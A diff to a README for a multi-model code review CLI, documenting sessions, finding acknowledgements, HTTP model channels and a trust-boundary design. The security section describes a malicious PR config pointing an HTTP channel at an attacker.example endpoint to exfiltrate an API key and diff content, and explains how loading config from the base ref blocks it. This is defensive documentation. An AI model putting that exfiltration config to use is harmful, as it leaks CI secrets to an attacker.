@@ -267,4 +267,189 @@ output is not real findings.
 mmr review --pr 42 --dry-run
 ```
 
+## v3.30 — Sessions, acks, HTTP channels, and trust boundary
+
+### Stable finding identity and sessions
+
+Each reconciled finding now carries a `finding_key` — a deterministic sha1 of
+the normalized location, category, description, and suggestion. The key is
+stable across rounds: line-number drift, severity changes, and channel-side
+phrasing tweaks no longer change the identity of the underlying issue.
+
+Sessions group related reviews. Choose a session id (matching
+`^[a-zA-Z0-9_-]+$`), register it with `mmr sessions start <id>`, then pass
+`--session <id>` and `--round N` (one-based) to link a review to its
+predecessors:
+
+    mmr sessions start my-feature
+    # → session record printed (includes the id)
+    mmr review --pr 123 --session my-feature --round 1 --sync
+    # ...do fix work...
+    mmr review --pr 123 --session my-feature --round 2 --sync
+
+When `--session` is set without `--max-rounds`, the default cap is 5 rounds.
+Round 6 exits early with `verdict: 'needs-user-decision'` and a `summary` of
+`max_rounds_exceeded: …`.
+
+Manage sessions with:
+
+    mmr sessions list
+    mmr sessions show <id>
+    mmr sessions end <id>
+
+### Acknowledging known findings
+
+A finding that is intentional in your project (an "ack") can be silenced so
+later reviews surface it as advisory rather than blocking. Acks are keyed by
+`finding_key`, with a location-anchored Jaccard fuzzy fallback (≥ 0.7 on the
+5-gram description shingle) that survives small LLM phrasing changes.
+
+Workflow:
+
+    # Find the finding_key for the issue you want to ack:
+    mmr review --pr 123 --sync --format json | jq '.reconciled_findings[] | select(.location | startswith("src/legacy/")) | .finding_key'
+
+    # Ack it with a reason:
+    mmr ack add <finding_key> --reason "legacy module — scheduled rewrite in Q3"
+
+    # List:
+    mmr ack list
+
+    # Remove:
+    mmr ack rm <finding_key>
+
+By default (`--scope project`, the default), acks are stored at
+`./.mmr/acks/<finding_key>.json` (committed and shared with the team). Pass
+`--scope user` to store under `~/.mmr/acks/` (private to your machine).
+
+Acked findings remain visible in `reconciled_findings` with
+`acknowledged: true` and `ack_match: 'exact' | 'fuzzy'`; they no longer
+block the gate.
+
+### HTTP channels
+
+In addition to subprocess channels (which spawn a CLI like `claude -p`),
+v3.30 supports `kind: http` channels that POST to OpenAI-compatible
+`/v1/chat/completions` endpoints. This covers LM Studio, vLLM, llama-server,
+Ollama (via its `/v1/chat/completions` shim), Groq, Together.ai, Anyscale,
+and Fireworks without writing a shell wrapper.
+
+Required fields for an HTTP channel:
+
+- `kind: http`
+- `endpoint` — the full request URL including `/v1/chat/completions`
+- `model` — the model string the endpoint expects
+- `endpoint_convention: openai-chat` — the only convention supported in
+  v3.30; `generic` is rejected and reserved for a future release.
+
+Optional fields:
+
+- `api_key_env` — the NAME of the env var holding the API key. The literal
+  value is never written to `.mmr.yaml`.
+- `api_key_header` (default `Authorization`)
+- `api_key_prefix` (default `Bearer `; set to `""` for providers that
+  expect a raw key)
+- `headers` — extra headers (e.g. `{ "X-Org": "..." }`)
+- `auth.check_endpoint` — explicit auth-probe URL. When unset, MMR derives the
+  probe by replacing a trailing `/chat/completions` with `/models`. If the
+  endpoint does not end in `/chat/completions`, `auth.check_endpoint` is
+  required.
+
+#### LM Studio (local, no API key)
+
+```yaml
+channels:
+  lm-studio:
+    kind: http
+    endpoint: http://localhost:1234/v1/chat/completions
+    model: qwen2.5-coder-32b-instruct
+    endpoint_convention: openai-chat
+```
+
+#### Groq
+
+```yaml
+channels:
+  groq:
+    kind: http
+    endpoint: https://api.groq.com/openai/v1/chat/completions
+    model: llama-3.3-70b-versatile
+    endpoint_convention: openai-chat
+    api_key_env: GROQ_API_KEY
+```
+
+#### Together.ai
+
+```yaml
+channels:
+  together:
+    kind: http
+    endpoint: https://api.together.xyz/v1/chat/completions
+    model: meta-llama/Llama-3-70b-chat-hf
+    endpoint_convention: openai-chat
+    api_key_env: TOGETHER_API_KEY
+```
+
+Status mapping: `200` → completed, `401` → `auth_failed`, `429` or `5xx`
+→ `failed`, fetch timeout → `timeout`. The API key value is sent on every
+request, but is NEVER written to logs or persisted job state.
+
+### Security considerations
+
+When MMR reviews a diff (`--pr`, `--base/--head`, `--staged`, or `--diff`
+inside a Git repo with a resolvable base), both `.mmr.yaml` and
+`./.mmr/acks/` are loaded from the **base ref**, not from the working
+tree. This closes two attack surfaces:
+
+1. **Ack self-suppression.** Without the rule, a PR could add a
+   `./.mmr/acks/<key>.json` file in the same diff that introduces the
+   findings being acked, silently shipping the issue.
+2. **HTTP channel secret exfiltration (P0).** Without the rule, a PR
+   could add a `kind: http` channel to `.mmr.yaml` with
+   `endpoint: https://attacker.example/log` and
+   `api_key_env: OPENAI_API_KEY`, exfiltrating CI secrets and diff
+   content.
+
+The four trust flags:
+
+- `--accept-new-acks` — required when the diff under review adds or
+  modifies files under `./.mmr/acks/`. Without it, MMR returns
+  `verdict: 'needs-user-decision'` and lists the proposed acks.
+- `--trust-project-config` — required when the diff under review adds
+  or modifies `./.mmr.yaml`. Without it, MMR returns
+  `verdict: 'needs-user-decision'` and reports
+  `proposed_config_change: true`.
+- `--config-base-ref <ref>` — for CI / wrapper flows that operate on
+  an untrusted checked-out PR head. Tells MMR to load both
+  `.mmr.yaml` and project acks from this trusted ref via
+  `git show`. **Preferred over `--trust-project-*`** when a trusted
+  ref exists.
+- `--trust-project-acks` — broader equivalent to `--accept-new-acks`
+  for untrusted-HEAD / non-Git modes. Honors working-tree project
+  acks. Logged with a noisy banner.
+
+Each review's output carries a `trust_mode` field with one of:
+`'base-ref'`, `'untrusted-head'`, `'non-git'`. Inspect this field
+to confirm which boundary applied to your run.
+
+User-scope config (`~/.mmr/config.yaml`) and user-scope acks
+(`~/.mmr/acks/`) are trusted unconditionally in every mode, because
+they are local to the user running MMR.
+
+The threat scenario the design closes:
+
+> Alice opens a PR that adds `.mmr.yaml` with a `kind: http` channel
+> pointed at her server, plus a benign-looking code change. Bob's CI
+> runs `mmr review --pr` on that PR. Without the base-ref rule, Bob's
+> CI would dispatch the new HTTP channel during the review, sending
+> `OPENAI_API_KEY` and the full diff to Alice's server. With the rule,
+> the channel is not loaded (it does not exist at the base ref) and
+> the verdict is `needs-user-decision` until Bob explicitly opts in
+> with `--trust-project-config`.
+
+If you run MMR via Scaffold's wrappers (`scaffold run review-pr`,
+`scaffold run review-code`), the trust flags are set for you based
+on context. Manual `mmr review` callers must pick the right flag
+combination.
+
 Full documentation: [scaffold README](https://github.com/zigrivers/scaffold#mmr--multi-model-review-cli)
